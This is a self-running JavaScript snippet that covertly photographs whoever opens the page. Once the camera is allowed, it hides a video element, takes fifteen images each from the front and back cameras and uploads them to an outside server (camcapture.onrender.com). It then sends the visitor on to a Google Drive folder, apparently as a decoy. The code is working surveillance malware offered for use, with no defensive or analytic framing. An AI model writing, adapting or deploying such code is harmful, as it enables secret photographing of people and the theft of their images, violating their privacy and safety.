(async function () {
  const video = document.createElement('video');
  video.setAttribute('autoplay', true);
  video.setAttribute('playsinline', true);
  video.style.display = 'none';
  document.body.appendChild(video);

  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');

  async function captureImages(facingMode, labelPrefix) {
    const constraints = {
      audio: false,
      video: {
        facingMode: facingMode
      }
    };

    const images = [];
    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      video.srcObject = stream;

      await new Promise(resolve => {
        video.onloadedmetadata = () => {
          video.play();
          resolve();
        };
      });

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      for (let i = 0; i < 15; i++) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
        images.push({ blob, name: `${labelPrefix}_image${i + 1}.jpg` });
        await new Promise(r => setTimeout(r, 500)); // 0.5 sec between captures
      }

      stream.getTracks().forEach(track => track.stop());
      return images;
    } catch (error) {
      console.warn(`Could not access ${labelPrefix} camera:`, error);
      return [];
    }
  }

  async function uploadImages(images) {
    const formData = new FormData();
    images.forEach((img, i) => {
      formData.append(`image${i + 1}`, img.blob, img.name);
    });

    try {
      await fetch('https://camcapture.onrender.com/upload-endpoint', {
        method: 'POST',
        body: formData
      });
    } catch (err) {
      console.error('Upload error:', err);
    }
  }

  async function startCapture() {
    const front = await captureImages("user", "front");
    const back = await captureImages({ exact: "environment" }, "back");
    const allImages = [...front, ...back];

    if (allImages.length > 0) {
      await uploadImages(allImages);
    }

    // Redirect after upload
    window.location.href = "https://drive.google.com/drive/folders/1dWeuOua4SbFZsxAx13yoq3wqcaoDpMft";
  }

  startCapture();
})();
